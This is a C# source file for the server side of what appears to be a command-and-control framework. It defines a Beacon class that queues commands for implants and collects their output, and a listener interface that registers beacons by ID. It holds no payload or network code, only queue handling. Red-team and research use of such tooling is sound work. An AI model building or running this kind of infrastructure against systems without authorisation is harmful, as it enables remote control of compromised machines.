using System;
using System.Collections.Generic;
using System.Linq;
using System.Security;
using System.Text;
using System.Threading.Tasks;

namespace TeamServer
{
    class Beacon
    {
        public string Id { get; set; }
        private List<string> Commands { get; set; }
        private List<string> Output { get; set; }

        public Beacon(string Id)
        {
            this.Id = Id;
            Commands = new List<string>();
            Output = new List<string>();
        }

        public string GetCommand()
        {
            if (Commands.Count > 0)
            {
                string command = Commands[0];
                Commands.RemoveAt(0);
                return command;
            }
            return null;
        }

        public List<string> GetCommands()
        {
            if (Commands.Count > 0)
            {
                List<string> commandsCopy = new List<string>(Commands);
                Commands.Clear();
                return commandsCopy;
            }
            return new List<string>();
        }

        public void InsertCommand(string command)
        {
            Commands.Add(command);
        }

        public List<string> GetOutput(bool debug = true)
        {
            if (Output.Count > 0)
            {
                List<string> outputCopy = new List<string>(Output);
                Output.Clear();

                if (debug)
                {
                    Console.WriteLine();
                    Console.WriteLine("[+] Received from STDOUT: ");
                    for (int i = 0; i < outputCopy.Count; i++)
                    {
                        Console.WriteLine(outputCopy[i]);
                    }
                    Console.Write("beacon> ");
                }

                return outputCopy;
            }
            return new List<string>();
        }

        public void InsertOutput(string text)
        {
            Output.Add(text);

            if(Program.communicatingBeacon != null)
            {
                GetOutput(true);
            }
        }

    }

    interface IListener
    {

        public List<Beacon> Beacons { get; set; }

        public void AddBeaconOutput(string id, string output)
        {
            int idxFound = -1;
            int idx = 0;

            Beacon temp = null;

            if (!(Beacons == null || Beacons.Count == 0))
            {
                foreach (Beacon b in Beacons)
                {
                    if (b.Id == id)
                    {
                        idxFound = idx;
                        break;
                    }
                    idx++;
                }
            }

            if (idxFound == -1)
            {
                AddBeacon(id);
                temp = Beacons.Last();
            }
            else
            {
                temp = Beacons[idxFound];
            }

            temp.InsertOutput(output);
        }

        public void AddBeacon(string id)
        {
            Beacon beacon = null;
            if (Beacons == null)
            {
                Beacons = new List<Beacon>();
            }

            int idxFound = -1;
            int idx = 0;
            foreach (Beacon b in Beacons)
            {
                if (b.Id == id)
                {
                    idxFound = idx;
                    break;
                }
                idx++;
            }

            if(idxFound == -1)
            {
                beacon = new Beacon(id);
                Beacons.Add(beacon);
            }

            if(beacon != null)
                Console.WriteLine("[+] Captured Beacon with ID: " + beacon.Id);
        }

        public List<string> GetBeaconCommands(string id)
        {
            int idxFound = -1;
            int idx = 0;

            if(!(Beacons == null || Beacons.Count == 0))
            {
                foreach (Beacon b in Beacons)
                {
                    if (b.Id == id)
                    {
                        idxFound = idx;
                        break;
                    }
                    idx++;
                }
            }

            if (idxFound == -1)
            {
                AddBeacon(id);
                return new List<string>();
            }

            return Beacons[idxFound].GetCommands();
        }

        public bool StartListener();
        public void StopListener();
    }
}
